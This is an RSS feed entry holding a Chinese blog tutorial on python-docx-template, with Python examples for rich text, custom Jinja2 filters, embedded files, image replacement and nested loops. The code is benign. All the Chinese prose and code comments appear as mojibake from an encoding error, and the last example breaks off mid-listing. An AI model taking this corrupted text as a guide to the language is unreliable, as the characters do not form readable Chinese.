<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-31T04:15:29.862Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ [python] python-docx-templateå®ç¨æ¡ä¾è§£æ ]]></title>
    <link>https://www.cnblogs.com/luohenyueji/p/19556736</link>
    <guid>19918132cf2f20b3f282b870aca18799</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/luohenyueji/p/19556736" title="åå¸äº 2026-01-31 09:17">
    <span role="heading" aria-level="2">[python] python-docx-templateå®ç¨æ¡ä¾è§£æ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>Python-docx-templateæ¯ä¸ä¸ªåè½å¼ºå¤§çWordææ¡£èªå¨åçæåºï¼å®åºäºæ¨¡æ¿å¼æçè®¾è®¡ææ³ï¼åè®¸ç¨æ·éè¿ç¼åæ¨¡æ¿ä¸Pythonä»£ç é»è¾åç¦»çæ¹å¼ï¼é«æçæç»æå¤æãæ ·å¼å¤æ ·çWordææ¡£ãå¨æç« <a href="https://www.cnblogs.com/luohenyueji/p/19503461" target="_blank">python-docx-templateæ¨¡æ¿åWordææ¡£çææå</a>ä»ç»è¯¥åºçåºç¡ç¨æ³ä¹ä¸ï¼æ¬æå°è¿ä¸æ­¥ç»åå®æ¹ç¤ºä¾ï¼æä¾å¤ä¸ªå®ç¨åºæ¯çä»£ç è§£æä¸æå±ï¼æ¶µçå¤ææ ·å¼ãèªå®ä¹è¿æ»¤å¨ãåµå¥å¾ªç¯åå¯ææ¬æ¸²æç­é«çº§åè½ï¼ä»¥æåææ¡£çæçæçä¸çµæ´»æ§ãä¸æå°åæ¨¡åå±å¼å·ä½ç¤ºä¾ä¸å®ç°ã</p>
<p>python-docx-templateçå®æ¹ä»£ç ä»åºå°åä¸ºï¼<a href="https://github.com/elapouya/python-docx-template" target="_blank" rel="noopener nofollow">python-docx-template</a>ï¼è¯¦ç»ææ¡£å¯åéï¼<a href="https://docxtpl.readthedocs.io/" target="_blank" rel="noopener nofollow">python-docx-template doc</a>ã</p>
<p><img src="https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/img1.png" alt="" loading="lazy"></p>
<p>æ¬æä½¿ç¨çpython-docx-templateçæ¬ä¸º0.20.2ï¼å®è£å½ä»¤å¦ä¸ï¼</p>
<blockquote>
<p>pip install docxtpl</p>
</blockquote>
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#1-å®ç¨æ¡ä¾" rel="noopener nofollow">1 å®ç¨æ¡ä¾</a><ul><li><a href="#11-è¡¨æ ¼æ ·å¼çæ" rel="noopener nofollow">1.1 è¡¨æ ¼æ ·å¼çæ</a></li><li><a href="#12-èªå®ä¹jinja2è¿æ»¤å¨" rel="noopener nofollow">1.2 èªå®ä¹Jinja2è¿æ»¤å¨</a></li><li><a href="#13-ææ¡£åµå¥" rel="noopener nofollow">1.3 ææ¡£åµå¥</a></li><li><a href="#14-èªå¨è½¬ä¹" rel="noopener nofollow">1.4 èªå¨è½¬ä¹</a></li><li><a href="#15-å¾çæ¿æ¢" rel="noopener nofollow">1.5 å¾çæ¿æ¢</a></li><li><a href="#16-å½ä»¤è¡æ§è¡" rel="noopener nofollow">1.6 å½ä»¤è¡æ§è¡</a></li><li><a href="#17-å¤å±åµå¥" rel="noopener nofollow">1.7 å¤å±åµå¥</a></li><li><a href="#18-å°åºå­ä½å¤ç" rel="noopener nofollow">1.8 å°åºå­ä½å¤ç</a></li><li><a href="#19-å¯ææ¬ä½¿ç¨" rel="noopener nofollow">1.9 å¯ææ¬ä½¿ç¨</a></li><li><a href="#110-éè¯¯ç®¡ç" rel="noopener nofollow">1.10 éè¯¯ç®¡ç</a></li></ul></li><li><a href="#2-åè" rel="noopener nofollow">2 åè</a></li></ul></div><p></p>
<h1 id="1-å®ç¨æ¡ä¾">1 å®ç¨æ¡ä¾</h1>
<h2 id="11-è¡¨æ ¼æ ·å¼çæ">1.1 è¡¨æ ¼æ ·å¼çæ</h2>
<p>æ¬ç¤ºä¾ç¨äºçæåå«å¯ææ¬æ ·å¼ä¸ååæ ¼èæ¯è²çWordè¡¨æ ¼ææ¡£ã</p>
<p>æ¨¡æ¿åå®¹ï¼</p>
<p><img src="https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/image.png" alt="" loading="lazy"></p>
<p>æ¸²æä»£ç ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/comments.py
from docxtpl import DocxTemplate, RichText
# data: python-docx-template/blob/master/tests/templates/cellbg_tpl.docx
tpl = DocxTemplate("templates/cellbg_tpl.docx")

context = {
    "alerts": [
        {
            "date": "2015-03-10",
            "desc": RichText("Very critical alert", color="FF0000", bold=True),
            "type": "CRITICAL",
            "bg": "FF0000",
        },
        {
            "date": "2015-03-11",
            "desc": RichText("Just a warning"),
            "type": "WARNING",
            "bg": "FFDD00",
        }
    ],
}

tpl.render(context)
tpl.save("output/cellbg.docx")
</code></pre>
<h2 id="12-èªå®ä¹jinja2è¿æ»¤å¨">1.2 èªå®ä¹Jinja2è¿æ»¤å¨</h2>
<p>æ¬ç¤ºä¾ä¸»è¦ä»ç»éè¿èªå®ä¹Jinja2è¿æ»¤å¨å®ç°å¨ææ°æ®æ¸²æï¼Jinja2æ¨¡æ¿ä¸­è¿æ»¤å¨çæ ¸å¿æ ¼å¼ä¸ºï¼<code>{{ åéå|è¿æ»¤å¨å(åæ°1, åæ°2, ...) }}</code>ï¼å¶ä¸­ï¼</p>
<ul>
<li><code>|</code>ï¼ç«çº¿ï¼æ¯è¿æ»¤å¨çåéç¬¦ï¼å·¦ä¾§æ¯è¦å¤ççåéï¼å³ä¾§æ¯è¿æ»¤å¨åç§°ï¼</li>
<li>æ¬å·<code>()</code>åæ¯ä¼ ç»è¿æ»¤å¨å½æ°çåæ°ï¼æ åæ°æ¶å¯çç¥æ¬å·ï¼ï¼</li>
<li>ç¤ºä¾ï¼<code>{{ base_value_float|my_filterB(2) }}</code> ä¸­ï¼<code>base_value_float</code>æ¯åéï¼<code>my_filterB</code>æ¯è¿æ»¤å¨åï¼<code>2</code>æ¯ä¼ éçåæ°ã</li>
</ul>
<p>æ¨¡æ¿åå®¹ï¼</p>
<p><img src="https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/image-1.png" alt="" loading="lazy"></p>
<p>æ¸²æä»£ç ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/custom_jinja_filters.py
from docxtpl import DocxTemplate
import jinja2

# åå»ºjinja2ç¯å¢å¯¹è±¡ï¼ç¨äºç®¡çæ¨¡æ¿æ¸²æçéç½®
jinja_env = jinja2.Environment()

# èªå®ä¹è¿æ»¤å¨å½æ°
def my_filterA(value, my_string_arg):
    # å°åå§å¼ååæ°å­ç¬¦ä¸²æ¼æ¥ï¼ä¸­é´å ç©ºæ ¼
    return_value = value + " " + my_string_arg
    return return_value
def my_filterB(value, my_float_arg):
    # å°åå§å¼ååæ°æ°å¼ç¸å 
    return_value = value + my_float_arg
    return return_value

# å°èªå®ä¹è¿æ»¤å¨æ³¨åå°jinja2ç¯å¢ä¸­ï¼ä½¿å¶è½å¨æ¨¡æ¿ä¸­è¢«è°ç¨
# æ³¨ååå¨Wordæ¨¡æ¿ä¸­å¯éè¿{{ åéå| my_filterA('åæ°') }}å½¢å¼ä½¿ç¨
jinja_env.filters["my_filterA"] = my_filterA
jinja_env.filters["my_filterB"] = my_filterB

context = {
    "base_value_string": " Hello",  
    "base_value_float": 1.5         
}
# data: python-docx-template/blob/master/tests/templates/custom_jinja_filters_tpl.docx
tpl = DocxTemplate("templates/custom_jinja_filters_tpl.docx")
tpl.render(context, jinja_env)
tpl.save("output/custom_jinja_filters.docx")
</code></pre>
<h2 id="13-ææ¡£åµå¥">1.3 ææ¡£åµå¥</h2>
<p>ä»¥ä¸ä»£ç å±ç¤ºäºå¦ä½æ¸²æå­Wordææ¡£ï¼æ¿æ¢ä¸»Wordææ¡£ä¸­åµå¥çåç±»æä»¶ï¼å¡«åæ°æ®åä¿å­ææ¡£ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/embedded.py
from docxtpl import DocxTemplate

# å è½½ååµå­æ¨¡æ¿æä»¶
# data: python-docx-template/blob/master/tests/templates/embedded_embedded_docx_tpl.docx
embedded_docx_tpl = DocxTemplate("templates/embedded_embedded_docx_tpl.docx")

# å®ä¹æ¨¡æ¿æ¸²æçä¸ä¸ææ°æ®
context = {
    "name": "John Doe",  # è¦å¡«åå°æ¨¡æ¿ä¸­çå§åå¼
}
embedded_docx_tpl.render(context)

# ä¿å­æ¸²æåçå­æ¨¡æ¿å°æå®è·¯å¾ï¼ä¾åç»­ä¸»æ¨¡æ¿è°ç¨
embedded_docx_tpl.save("output/embedded_embedded_docx.docx")

# å è½½ä¸»æ¨¡æ¿æä»¶
tpl = DocxTemplate("templates/embedded_main_tpl.docx")

# å®ä¹ä¸»æ¨¡æ¿çä¸ä¸ææ°æ®
context = {
    "name": "John Doe",
}

# æ¿æ¢ä¸»æ¨¡æ¿ä¸­åµå¥çWordææ¡£
# åæ°1ï¼æ¨¡åæ¬åµå¥çå ä½æä»¶è·¯å¾
# åæ°2ï¼è¦æ¿æ¢æçç®æ æä»¶è·¯å¾
tpl.replace_embedded(
    "templates/embedded_dummy.docx", "templates/embedded_static_docx.docx"
)

tpl.replace_embedded(
    "templates/embedded_dummy2.docx", "output/embedded_embedded_docx.docx"
)

# è¯´æï¼docx æ¬è´¨æ¯ zip åç¼©åï¼åµå¥çæä»¶ä¼å­å¨å¨word/embeddings/ç®å½ä¸
tpl.replace_zipname(
    "word/embeddings/Feuille_Microsoft_Office_Excel3.xlsx", 
    "templates/real_Excel.xlsx"  # è¦æ¿æ¢æçå®éæä»¶è·¯å¾
)
tpl.replace_zipname(
    "word/embeddings/Pr_sentation_Microsoft_Office_PowerPoint4.pptx",
    "templates/real_PowerPoint.pptx" 
)

tpl.render(context)
tpl.save("output/embedded.docx")
</code></pre>
<h2 id="14-èªå¨è½¬ä¹">1.4 èªå¨è½¬ä¹</h2>
<p>æ¬ç¤ºä¾å±ç¤ºäºå¨èªå¨è½¬ä¹æ¨¡å¼ä¸ï¼å°åå«XMLç¹æ®å­ç¬¦ãUnicodeææ¬åå¨æé®å¼å¯¹çä¸ä¸ææ°æ®æ¸²æå°æ¨¡æ¿ä¸­ã</p>
<p>æ¨¡æ¿åå®¹ï¼<br>
<img src="https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/image-2.png" alt="" loading="lazy"></p>
<p>æ¸²æä»£ç ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/escape_auto.py
import os
from unicodedata import name
from docxtpl import DocxTemplate
XML_RESERVED = """&lt;"&amp;'&gt;"""
# data: python-docx-template/blob/master/tests/templates/escape_tpl_auto.docx
tpl = DocxTemplate("templates/escape_tpl_auto.docx")

context = {
    "nested_dict": {name(str(c)): c for c in XML_RESERVED},
    "autoescape": 'Escaped "str &amp; ing"!',
    "autoescape_unicode": "This is an escaped &lt;unicode&gt; example \u4f60 &amp; \u6211",
    "iteritems": lambda x: x.items(),
}
# autoescape=Trueè¡¨ç¤ºèªå¨è½¬ä¹
tpl.render(context, autoescape=True)

OUTPUT = "output"
if not os.path.exists(OUTPUT):
    os.makedirs(OUTPUT)
tpl.save(OUTPUT + "/escape_auto.docx")
</code></pre>
<p>å®éä¸<code>iteritems(nested_dict)</code>å°±æ¯è°ç¨æ¸²æå®ä¹çlambdaå½æ°ï¼ænested_dictä¼ è¿å»ï¼æ¿å°å®çææé®å¼å¯¹ï¼</p>
<pre><code>{% for k, v in iteritems(nested_dict) %}
{{ k.capitalize() }}: {{ v }}{% endfor %}
</code></pre>
<p>ä¹å¯ä»¥å¨Jinja2æ¨¡æ¿ä¸­ä½¿ç¨Pythonè¡¨è¾¾å¼ï¼ç´æ¥è°ç¨å­å¸çitemæ¹æ³ï¼</p>
<pre><code>{% for k, v in nested_dict.items() %}
{{ k.capitalize() }}: {{ v }}{% endfor %}
</code></pre>
<h2 id="15-å¾çæ¿æ¢">1.5 å¾çæ¿æ¢</h2>
<p>ä»¥ä¸ç¤ºä¾è¯´æå¦ä½æ¿æ¢Wordæ¨¡æ¿ææ¡£ï¼åå«é¡µçé¡µèï¼ä¸­çå¾çï¼å¹¶æ¼ç¤ºå¦ä½å°å¤çåçææ¡£åå«éè¿å¸¸è§æ¹å¼ååå­æä»¶å¯¹è±¡ä¿å­ä¸ºæ¬å°æä»¶ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/header_footer_image_file_obj.py
from docxtpl import DocxTemplate
import io

# å®ä¹ä¸¤ä¸ªè¾åºææ¡£çè·¯å¾åæä»¶å
DEST_FILE = "output/header_footer_image_file_obj.docx"
DEST_FILE2 = "output/header_footer_image_file_obj2.docx"
# data: python-docx-template/blob/master/tests/templates/header_footer_image_tpl.docx
tpl = DocxTemplate("templates/header_footer_image_tpl.docx")

context = {
    "mycompany": "The World Wide company",  
}

# è¯»åæ¨¡æ¿ä¸­éè¦è¢«æ¿æ¢çå¾çæä»¶ï¼å¹¶è½¬æ¢ä¸ºåå­å­èæµå¯¹è±¡
dummy_pic = io.BytesIO(open("templates/dummy_pic_for_header.png", "rb").read())
# è¯»åæ°çæ¿æ¢å¾çæä»¶ï¼python.pngï¼ï¼å¹¶è½¬æ¢ä¸ºåå­å­èæµå¯¹è±¡
new_image = io.BytesIO(open("templates/python.png", "rb").read())

# å°dummy_picå¯¹åºçå¾çæ¿æ¢ä¸ºnew_imageå¯¹åºçå¾ç
tpl.replace_media(dummy_pic, new_image)
tpl.render(context)
tpl.save(DEST_FILE)

tpl = DocxTemplate("templates/header_footer_image_tpl.docx")

# å°åå­ä¸­çå¾çå­èæµæééç½®å°èµ·å§ä½ç½®
dummy_pic.seek(0)
new_image.seek(0)

# åæ¬¡æ§è¡å¾çæ¿æ¢æä½
tpl.replace_media(dummy_pic, new_image)
# åæ¬¡æ¸²ææ¨¡æ¿åé
tpl.render(context)

# åå»ºä¸ä¸ªç©ºçåå­å­èæµå¯¹è±¡ï¼ç¨äºä¸´æ¶å­å¨ææ¡£åå®¹
file_obj = io.BytesIO()
# å°å¤çåçææ¡£ä¿å­å°åå­å­èæµå¯¹è±¡ä¸­
tpl.save(file_obj)
# å°åå­å­èæµæééç½®å°èµ·å§ä½ç½®ï¼åå¤è¯»ååå®¹
file_obj.seek(0)

# ä»¥äºè¿å¶åå¥æ¨¡å¼æå¼ç¬¬äºä¸ªè¾åºæä»¶ï¼å°åå­ä¸­çææ¡£åå®¹åå¥æä»¶
with open(DEST_FILE2, "wb") as f:
    f.write(file_obj.read())
dummy_pic.close()
new_image.close()
</code></pre>
<p>ä¸è¿°ä»£ç å®ç°å¾çæ¿æ¢å¹¶éåºäºæä»¶åï¼èæ¯åºäºäºè¿å¶åå®¹çå¹éãè¿æ¯å ä¸º<code>replace_media</code>æ¹æ³æ ¹æ®å¾ççäºè¿å¶åå®¹æ¥è¯å«å¾åï¼èéä¾èµæä»¶åæå¨Wordä¸­æ¾ç¤ºçåç§°ã<br>
ç±äºWordææ¡£ (.docx) æ¬è´¨ä¸æ¯ä¸ä¸ªåç¼©åï¼å¶ä¸­çå¾çä»¥äºè¿å¶å½¢å¼å­å¨å¨<code>word/media/</code>ç®å½ä¸ï¼ä¸å¨æäºWordçæ¬ä¸­ï¼å¾çæä»¶åå¯è½è¢«èªå¨éå½åï¼ä¾å¦æ¹ä¸º <code>image1.png</code>ï¼ï¼ä¸åå§æä»¶åæ å³ã</p>
<p><strong>æ³¨æð</strong>ï¼å¾æ¿æ¢å¾çå°ºå¯¸ä¸å®è¿å¤§ï¼ä¸éå³é­Wordæ¨¡æ¿çå¾çåç¼©åè½ï¼å¦åWordä¼èªå¨åç¼©æ¨¡æ¿ä¸­çå¾çï¼æ¹åå¶äºè¿å¶æ°æ®ï¼æç»å¯¼è´å¾çæ¿æ¢æä½å¤±è´¥ã</p>
<h2 id="16-å½ä»¤è¡æ§è¡">1.6 å½ä»¤è¡æ§è¡</h2>
<p>ä»¥ä¸ç¤ºä¾å±ç¤ºäºç´æ¥å¨å½ä»¤è¡ä¸­ä½¿ç¨docxtplæ¨¡åï¼åºäºæ¨¡æ¿æä»¶åä½ä¸ºä¸ä¸ææ°æ®çJSONæä»¶çædocxææ¡£ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/module_execute.py
import os
# data: python-docx-template/blob/master/tests/templates/module_execute_tpl.docx
TEMPLATE_PATH = "templates/module_execute_tpl.docx"
# å­å¨éè¦å¡«åå°æ¨¡æ¿ä¸­çæ°æ®
JSON_PATH = "templates/module_execute.json"
OUTPUT_FILENAME = "output/module_execute.docx"
# docxtplå½ä»¤åæ°ï¼å¼ºå¶è¦çå·²å­å¨çè¾åºæä»¶
OVERWRITE = "-o"
# docxtplå½ä»¤åæ°ï¼éé»æ¨¡å¼æ§è¡ï¼ä¸è¾åºé¢å¤æ¥å¿ä¿¡æ¯
QUIET = "-q"
 # å é¤å·²å­å¨çè¾åºæä»¶
if os.path.exists(OUTPUT_FILENAME):
    os.unlink(OUTPUT_FILENAME) 

# åæ¢å·¥ä½ç®å½å°å½åèæ¬æå¨çç®å½
os.chdir(os.path.dirname(__file__))

# éè¿Pythonæ¨¡åæ¹å¼è°ç¨docxtplï¼ä¼ å¥æ¨¡æ¿ãæ°æ®ãè¾åºè·¯å¾ååæ°
# å¯éè¿python -m docxtpl -helpæ¥çè°ç¨å¸®å©
cmd = "python -m docxtpl %s %s %s %s %s" % (
    TEMPLATE_PATH,       # æ¨¡æ¿æä»¶è·¯å¾
    JSON_PATH,           # æ°æ®æä»¶è·¯å¾
    OUTPUT_FILENAME,    # è¾åºæä»¶è·¯å¾
    OVERWRITE,           # è¦çåæ°
    QUIET                # éé»åæ°
)

print('Executing "%s" ...' % cmd)
os.system(cmd)
if os.path.exists(OUTPUT_FILENAME):
    print("    --&gt; File %s has been generated." % OUTPUT_FILENAME)
</code></pre>
<h2 id="17-å¤å±åµå¥">1.7 å¤å±åµå¥</h2>
<p>ä»¥ä¸ç¤ºä¾å±ç¤ºäºå¦ä½éè¿æ¨¡æ¿è¯­æ³å®ç°éå±å¾ªç¯æ¸²æï¼æç»çæåå«è¿äºåµå¥æ°æ®çWordææ¡£ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/nested_for.py
from docxtpl import DocxTemplate
# data: python-docx-template/blob/master/tests/templates/nested_for_tpl.docx
tpl = DocxTemplate("templates/nested_for_tpl.docx")

context = {
    "dishes": [
        {"name": "Pizza", "ingredients": ["bread", "tomato", "ham"]},
        {
            "name": "Hamburger",
            "ingredients": ["bread", "chopped steak", "cheese"],
        },
    ],
    "authors": [
        {
            "name": "Saint-Exupery",
            "books": [
                {"title": "Le petit prince"},
                {"title": "L'aviateur"},
            ],
        },
        {
            "name": "Barjavel",
            "books": [
                {"title": "Ravage"},
                {"title": "La nuit des temps"},
            ],
        },
    ],
}

tpl.render(context)
tpl.save("output/nested_for.docx")
</code></pre>
<h2 id="18-å°åºå­ä½å¤ç">1.8 å°åºå­ä½å¤ç</h2>
<p>è¥å­ä½æ¾ç¤ºå¼å¸¸ï¼éå¸¸æ¯ç±äºå­ä½ä»ééäºç¹å®æå­åºåãè§£å³æ¹æ³æ¯å¨å­ä½ååå ä¸åºåæ è¯ååå·ï¼å¦ eastAsia:å¾®è½¯éé»ï¼ï¼ä»èæå®æå­çåºåæ¸²ææ¹å¼ãå¦æä¸æ¸æ¥åºåæ è¯ï¼ä¹å¯è§£åæ¨¡æ¿æä»¶ååæ<code>document.xml</code>ç¡®è®¤å­ä½å¯¹åºçåºåãå¸¸è§åºåæ è¯åæ¬ï¼</p>
<ul>
<li>eastAsiaï¼ç¨äºä¸äºå­ç¬¦å¦ä¸­æ</li>
<li>hAnsiï¼ç¨äºæä¸å­ç¬¦å¦è±æ</li>
<li>asciiï¼ç¨äºå¼å®¹æ§çè±æ</li>
</ul>
<p>ä»¥ä¸ä»£ç å±ç¤ºäºå¦ä½è®¾ç½®ä¸åçä¸äºå­ä½ï¼</p>
<pre><code class="language-python"># python-docx-template/blob/master/tests/richtext_eastAsia.py
from docxtpl import DocxTemplate, RichText
# data: python-docx-template/blob/master/tests/templates/richtext_eastAsia_tpl.docx
tpl = DocxTemplate("templates/richtext_eastAsia_tpl.docx")
# 2. åå»ºå¯ææ¬å¯¹è±¡ï¼åå«è®¾ç½®ä¸åçä¸äºå­ä½
# eastAsia: åç¼è¡¨ç¤ºè¯¥å­ä½è®¾ç½®ä»ä½ç¨äºä¸äºå­ç¬¦ï¼ä¸­æãæ¥æãé©æç­ï¼
rt = RichText("æµè¯TEST", font="eastAsia:Microsoft YaHei")
ch = RichText("æµè¯TEST", font="eastAsia:å¾®è½¯éé»")
sun = RichText("æµè¯TEST", font="eastAsia:SimSun")
context = {
    "example": rt,
    "Chinese": ch,
    "simsun": sun,
}

tpl.render(context)
tpl.save("output/richtext_eastAsia.docx")
</code></pre>
<h2 id="19-å¯ææ¬ä½¿ç¨">1.9 å¯ææ¬ä½¿ç¨</h2>
<p>Python-docx-templateçæ ¸å¿åè½æ¯åºäºJinja2è¯­æ³å¨æçæWordææ¡£ãå¶RichTextç±»è¿ä¸æ­¥å¢å¼ºäºçµæ´»æ§ï¼åè®¸ç´æ¥ä»¥ç¼ç¨æ¹å¼æå¥æ ¼å¼ä¸°å¯çææ¬ï¼èæ éä¸ºæ¯ç§æ ·å¼ç»ååç¬è®¾ç½®æ¨¡æ¿åéãRichTextå¯¹è±¡å¯å¨åå§åæ¶ç´æ¥ä¼ å¥ææ¬ï¼éè¿å¤æ¬¡è°ç¨addæ¹æ³å¯åå¶è¿½å ä¸åæ ¼å¼çææ¬çæ®µãæåï¼å°è¯¥å¯¹è±¡æ´ä½èµç»æ¨¡æ¿ä¸ä¸æä¸­çåéãå¨Wordæ¨¡æ¿ä¸­ï¼åªéä½¿ç¨<code>{{ rich_text_var }}</code>å¼ç¨è¯¥åéï¼å³å¯æ¸²ææåå«å¤ç§æ ¼å¼çè¿ç»­æ®µè½ã</p>
<p><img src="https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/img2.png" alt="" loading="lazy"></p>
<p>addæ¹æ³æ¯æå»ºRichTextå¯¹è±¡çæ ¸å¿ï¼å¶ææåæ°åç¨äºæ§å¶å½åæä½ææ·»å ææ¬çæ ¼å¼ï¼</p>
<table>
<thead>
<tr>
<th style="text-align: left">åæ°</th>
<th style="text-align: left">ç±»å</th>
<th style="text-align: left">é»è®¤å¼</th>
<th style="text-align: left">è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">text</td>
<td style="text-align: left">str</td>
<td style="text-align: left">æ </td>
<td style="text-align: left">å¯ä¸å¿éåæ°ï¼è¦è¿½å çææ¬åå®¹</td>
</tr>
<tr>
<td style="text-align: left">style</td>
<td style="text-align: left">str</td>
<td style="text-align: left">None</td>
<td style="text-align: left">åºç¨æ®µè½æ ·å¼ï¼è¿ä¼å½±åæ´ä¸ªç±RichTextå¯¹è±¡çæçæ®µè½çæ ·å¼</td>
</tr>
<tr>
<td style="text-align: left">color</td>
<td style="text-align: left">str</td>
<td style="text-align: left">None</td>
<td style="text-align: left">å­ä½é¢è²æ¯æåå­è¿å¶ï¼å¦#FF0000ï¼æWordé¢è®¾é¢è²åï¼å¦redï¼</td>
</tr>
<tr>
<td style="text-align: left">highlight</td>
<td style="text-align: left">str</td>
<td style="text-align: left">None</td>
<td style="text-align: left">ææ¬èæ¯é«äº®è²ï¼åå¼åcoloråæ°</td>
</tr>
<tr>
<td style="text-align: left">size</td>
<td style="text-align: left">int</td>
<td style="text-align: left">None</td>
<td style="text-align: left">å­ä½å¤§å°</td>
</tr>
<tr>
<td style="text-align: left">subscript</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">None</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ææ¬æ¾ç¤ºä¸ºä¸æ ï¼ä¸superscriptäºæ¥</td>
</tr>
<tr>
<td style="text-align: left">superscript</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">None</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ææ¬æ¾ç¤ºä¸ºä¸æ ï¼ä¸subscriptäºæ¥</td>
</tr>
<tr>
<td style="text-align: left">bold</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">False</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ï¼ææ¬å ç²</td>
</tr>
<tr>
<td style="text-align: left">italic</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">False</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ï¼ææ¬å¾æ</td>
</tr>
<tr>
<td style="text-align: left">underline</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">False</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ï¼ææ¬æ·»å ä¸åçº¿</td>
</tr>
<tr>
<td style="text-align: left">strike</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">False</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ï¼ææ¬æ·»å å é¤çº¿</td>
</tr>
<tr>
<td style="text-align: left">font</td>
<td style="text-align: left">str</td>
<td style="text-align: left">None</td>
<td style="text-align: left">å­ä½åç§°</td>
</tr>
<tr>
<td style="text-align: left">url_id</td>
<td style="text-align: left">str</td>
<td style="text-align: left">None</td>
<td style="text-align: left">æ·»å è¶é¾æ¥ï¼éè¦ä¼ å¥ä¸ä¸ªé¾æ¥IDï¼è¯¥IDä¸è¬éè¿ææ¡£å¯¹è±¡çbuild_url_id()æ¹æ³çæ</td>
</tr>
<tr>
<td style="text-align: left">rtl</td>
<td style="text-align: left">bool</td>
<td style="text-align: left">False</td>
<td style="text-align: left">è®¾ä¸ºTrueæ¶ï¼ææ¬ä»å³åå·¦æåï¼ä»å¯¹é¿æä¼¯è¯­ãå¸ä¼¯æ¥è¯­ç­ææ</td>
</tr>
<tr>
<td style="text-align: left">lang</td>
<td style="text-align: left">str</td>
<td style="text-align: left">None</td>
<td style="text-align: left">è®¾ç½®ææ¬çè¯­è¨ï¼ç¨äºæ¼åæ£æ¥åæ­å­</td>
</tr>
</tbody>
</table>
<blockquote>
<p>éè¦æç¤ºð©ï¼styleï¼æ®µè½æ ·å¼ï¼åæ°æ¯è¾ç¹æ®ãå®éå¸¸åªå¨ç¬¬ä¸æ¬¡è°ç¨addæ¹æ³æ¶ææï¼åç»­è°ç¨ä¸­åè®¾ç½®styleéå¸¸ä¼è¢«å¿½ç¥ã</p>
</blockquote>
<p>ä»¥ä¸æ¯ä¸æ®µä½¿ç¨ç¤ºä¾ä»£ç ï¼æé¡ºåºä»ç»<code>RichText.add()</code>æ¹æ³çåä¸ªåæ°ï¼</p>
<pre><code class="language-python">from docxtpl import DocxTemplate, RichText
import os
# 1. åå»ºæ¨¡æ¿å¯¹è±¡å¹¶åå§åRichText
doc = DocxTemplate("template.docx")
rt = RichText()

# 2. æ·»å åºç¡ææ¬ï¼å¿éåæ°ï¼
rt.add("è¿æ¯æ®éææ¬")

# 3. è®¾ç½®æ®µè½æ ·å¼ï¼å½±åæ´ä¸ªæ®µè½ï¼
rt.add("\næ é¢ææ¬", style="Heading1")

# 4. è®¾ç½®å­ä½é¢è²
rt.add(" çº¢è²æå­", color="#FF0000")
rt.add(" èè²æå­", color="blue")

# 5. è®¾ç½®èæ¯é«äº®
rt.add(" é»åºæå­", highlight="yellow")

# 6. è®¾ç½®å­ä½å¤§å°ï¼åä½ï¼ç£ï¼
rt.add(" å°å·å­", size=8)
rt.add(" å¤§å·å­", size=20)

# 7. ä¸ä¸æ è®¾ç½®
rt.add(" æ­£å¸¸æå­")
rt.add(" ä¸æ ", superscript=True)
rt.add(" ä¸æ ", subscript=True)

# 8. å­ä½æ ·å¼
rt.add(" å ç²", bold=True)
rt.add(" å¾æ", italic=True)
rt.add(" ä¸åçº¿", underline=True)
rt.add(" å é¤çº¿", strike=True)

# 9. å­ä½è®¾ç½®
rt.add(" å®ä½", font="eastAsia:SimSun")
rt.add(" å¾®è½¯éé»", font="eastAsia:Microsoft YaHei")

# 10. è¶é¾æ¥ï¼éè¦åçæé¾æ¥IDï¼
url_id = doc.build_url_id("https://www.example.com")
rt.add(" è¶é¾æ¥ææ¬", url_id=url_id)

# 11. æå­æ¹å
rt.add(" æ­£å¸¸æ¹å")
